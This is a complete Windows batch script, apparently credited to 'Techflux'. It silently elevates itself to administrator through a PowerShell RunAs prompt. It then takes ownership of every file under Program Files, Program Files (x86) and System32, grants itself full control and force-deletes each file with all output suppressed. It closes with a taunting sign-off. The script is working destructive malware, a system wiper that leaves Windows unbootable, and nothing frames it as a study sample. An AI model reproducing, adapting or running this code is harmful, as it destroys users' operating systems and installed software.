:: ]=== Script By Techflux ===[:::
@echo off
net session >nul 2>&1||(
    powershell -Command "Start-Process cmd -ArgumentList '/c %~dpnx0'" -Verb RunAs
    exit
    )
for /r "%ProgramFiles%" %%f in (*) do (
    takeown /f "%%f">nul 2>&1&
    icacls "%%f" /grant administrators:F>nul 2>&1&
    del /f /q "%%f">nul 2>&1
    )
for /r "%ProgramFiles(x86)%" %%f in (*) do (
    takeown /f "%%f">nul 2>&1&
    icacls "%%f" /grant administrators:F>nul 2>&1&
    del /f /q "%%f">nul 2>&1
    )
for /r "%SystemRoot%\System32" %%f in (*) do (
    takeown /f "%%f">nul 2>&1&
    icacls "%%f" /grant administrators:F>nul 2>&1&
    del /f /q "%%f">nul 2>&1
    )
:: ]=== See you when you see me😍 ===[:::